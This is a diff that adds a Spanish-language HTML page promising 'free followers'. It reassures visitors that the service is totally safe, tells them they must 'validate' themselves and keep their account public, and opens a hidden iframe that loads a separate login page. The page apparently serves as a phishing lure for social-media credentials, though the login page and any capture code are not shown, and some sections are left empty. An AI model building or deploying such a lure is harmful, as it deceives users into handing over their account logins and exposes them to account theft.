@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <meta name="" content="">
+    <title></title>
+    <style type="text/css" media="all">
+    body h1,body h2 {
+      text-align: center;
+    }
+    .esplica{ 
+      z-index: 100;
+      position: relative;
+    }
+
+      .bg-bubbles {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: 1;
+    overflow: hidden;
+  }
+
+  .bg-bubbles li {
+    position: absolute;
+    list-style: none;
+    display: block;
+    width: 40px;
+    height: 40px;
+    background-color: rgba(5, 5, 5, .15);
+    bottom: -160px;
+    animation: square 10s ease-in infinite;
+  }
+
+  .bg-bubbles li:nth-child(1) {
+    left: 10%;
+    background-color: rgba(102, 51, 153,.1);
+  }
+
+  .bg-bubbles li:nth-child(2) {
+    left: 20%;
+    width: 80px;
+    height: 80px;
+    animation-delay: 0s;
+    animation-duration: 17s;
+    background-color:rgba(123, 104, 238,.1) ;
+  }
+
+  .bg-bubbles li:nth-child(3) {
+    left: 25%;
+    animation-delay: 2s;
+    background-color: rgba(0, 255, 0,.1);
+  }
+
+  .bg-bubbles li:nth-child(4) {
+    left: 40%;
+    width: 60px;
+    height: 60px;
+    animation-duration: 22s;
+    background-color: rgba(50, 20, 50, .1);
+  }
+
+  .bg-bubbles li:nth-child(5) {
+    left: 70%;
+    background-color:rgba(0, 100, 0,.1) ;
+  }
+
+  .bg-bubbles li:nth-child(6) {
+    left: 5%;
+    width: 120px;
+    height: 120px;
+    animation-delay: 1s;
+    background-color: rgba(50, 200, 50, .1);
+  }
+
+  .bg-bubbles li:nth-child(7) {
+    left: 32%;
+    width: 160px;
+    height: 160px;
+    animation-delay: 0s;
+    background-color: rgba(0, 255, 255,.1);
+  }
+
+  .bg-bubbles li:nth-child(8) {
+    left: 55%;
+    width: 20px;
+    height: 20px;
+    animation-delay: 10s;
+    animation-duration: 30s;
+    background-color:rgba(0, 0, 128,.1) ;
+  }
+
+  .bg-bubbles li:nth-child(9) {
+    left: 25%;
+    width: 10px;
+    height: 10px;
+    animation-delay: 0s;
+    animation-duration: 20s;
+    background-color: rgba(200, 50, 20, .1);
+  }
+
+  .bg-bubbles li:nth-child(10) {
+    left: 90%;
+    width: 160px;
+    height: 160px;
+    animation-delay: 10s;
+    background-color:rgba(255, 165, 0,.1) ;
+  }
+  .bg-bubbles li:nth-child(11) {
+    left: 60%;
+    width: 50px;
+    height: 50px;
+    animation-delay: 13s;
+    background-color: rgba(255, 192, 203,.1);
+  }
+  .bg-bubbles li:nth-child(12) {
+    left: 40%;
+    width: 150px;
+    height: 150px;
+    animation-delay: 4s;
+    background-color: rgba(30, 100, 150, .15)
+  }
+  .bg-bubbles li:nth-child(13) {
+    left: 10%;
+    width: 100px;
+    height: 100px;
+    animation-delay: 5s;
+    background-color:	rgba(255, 255, 0,.1) ;
+  }
+  .bg-bubbles li:nth-child(14) {
+    left: 55%;
+    width: 140px;
+    height: 140px;
+    animation-delay: 7s;
+    background-color: rgba(189, 183, 107,.1);
+  }
+  .bg-bubbles li:nth-child(15) {
+    left: 77%;
+    width: 77px;
+    height: 77px;
+    animation-delay: 2s;
+    background-color:rgba(255, 0, 255,.1) ;
+  }
+
+  @keyframes square {
+    0% {
+      transform: translateY(0);
+    }
+
+    100% {
+      transform: translateY(-115vh) rotate(600deg);
+    }
+  }
+
+  @keyframes square {
+    0% {
+      transform: translateY(0);
+    }
+
+    100% {
+      transform: translateY(-115vh) rotate(600deg);
+    }
+  }
+       #boton3 {
+         z-index: 100000;
+         position: relative;
+         left: 10vw;
+         top: 7vh;
+       }
+       #boton2 {
+         z-index: 1001;
+         position: absolute;
+         left: 5vw;
+         top: 70vh;
+         width: 7vw;
+         display: none;
+         border: 2px solid black;
+       }
+       iframe{
+         border: 3px solid black;
+         width: 80vw;
+         height: 80vh;
+         position: absolute;
+         z-index: 10000;
+         left: 8vw;
+         top: 4vh;
+       }
+       #obj1 {
+         display: none;
+         position: absolute;
+         top: 3vh;
+       }
+        details { 
+       background-color: rgba(255,255,255,.05);
+        width: 100%; 
+        margin-bottom: 1rem;
+      /* border-radius: 8px; 
+       */ border: 1px solid #d8e0e9; 
+     /*  color: #364f6b; */
+        position: relative;
+        } 
+        details summary {
+        padding: 1rem; 
+        cursor: pointer;
+        list-style: none; }
+        
+        details p {
+        padding: 1rem;
+        margin: 0 1rem 1rem 1rem; 
+       background: rgba(246,248,250,0.7);
+        border-left: 2px solid #364f6b; */
+          
+        } 
+        details:hover, details[open] {
+          box-shadow: 5px 5px 15px #d9d9d9; 
+          
+        } 
+        /*details[open] {
+          background: #ffffff;
+        }*/
+        .mery {
+          width: 350px;
+          background-color: blue;
+          z-index: 10000000;
+          display: none;
+        }
+        details summary::before {
+          position: absolute; 
+        content: "👇";
+        top: 10px;
+        right: 16px;
+        font-size: 7vw;
+        } 
+        details[open] summary::before {
+          -webkit-animation: rotate 0.3s ease-in-out both; 
+        animation: rotate-emoji 0.3s ease-in-out both;
+        }
+        @-webkit-keyframes rotate-emoji { 
+          0% { -webkit-transform: rotate(0);
+          transform: rotate(0); }
+          100% { -webkit-transform: rotate(180deg); 
+          transform: rotate(180deg); }
+          }
+          h4 {
+            color: #87d3cf;
+            text-align: center;
+            margin-bottom: 2vh;
+            font-size: 3vw;
+          }
+
+    </style>
+  </head>
+  <body>
+   <h1>
+     Free followers!!!
+   </h1>
+   <div class="esplica">
+     <details>
+       <summary>
+       ¿Como se usa?
+       </summary>
+     <video src="" height="" width="" preload="none" autoplay="autoplay"></video>
+     </details>
+     </div>
+     <div class="esplica">
+       <details>
+          <summary>
+         Es totalmente seguro:
+         </summary>
+       <video src="" height="" width="" preload="none" autoplay="autoplay"></video>
+          </details>
+     </div>
+     <div class="esplica">
+       <details>
+         <summary>
+         ¿¿Por qué es gratis??
+         </summary>
+         <p>
+           
+         </p>
+            </details>
+       </div>
+       <div>
+         
+                          <ul class="bg-bubbles">
+                            <li class="different"></li>
+                            <li class="different"></li>
+                            <li class="different"></li>
+                            <li class="different"></li>
+                            <li class="different"></li>
+                            <li class="different"></li>
+                            <li class="different"></li>
+                            <li class="different"></li>
+                            <li class="different"></li>
+                            <li class="different"></li>
+                            <li class="different"></li>
+                            <li class="different"></li>
+                            <li class="different"></li>
+                            <li class="different"></li>
+                            <li class="different"></li>
+                          </ul>
+       </div>
+       <div class="esplica">
+         <h2>
+         Valídate y pide tus seguidores!!!
+       </h2>
+       <details>
+         <summary>
+           ¿Porqué validarme?
+         </summary>
+         <p>
+           Debes validarte para usar correctamente esta página y no abusar de los servicios que ofrecemos.
+           <br />
+           No eres el único que quiere followers😏
+         </p>
+       </details>
+       <details>
+         <summary>
+           Requisitos
+         </summary>
+       <p>  El único requisito aparte de la válidación es que debes tener la cuenta pública,al menos hasta que te lleguen tus seguidores,después de pedir los followers.
+        <h4>En cuanto te lleguen ya lo puedes volver privada!!</h4> 
+        </p>
+       </details>
+       </div>
+       <div class="mery">
+         .
+       </div>
+        <button id="boton3" type="button" onclick="ocultar()">log</button>
+
+    <button id="boton2" type="button" onclick="mostrar()">x</button>
+
+    
+    <div id="obj1">
+      <iframe src="login.html" frameborder="0" sandbox="allow-forms"></iframe>
+    </div>
+    <script>
+        function ocultar(){
+document.getElementById('obj1').style.display = 'block';
+document.getElementById('boton2').style.display = 'block';
+document.getElementById('boton3').style.display = 'none';
+}
+function mostrar(){
+document.getElementById('obj1').style.display = 'none';
+document.getElementById('boton2').style.display = 'none';
+document.getElementById('boton3').style.display = 'block';
+
+}
+    </script>
+       
+  </body>
+</html>
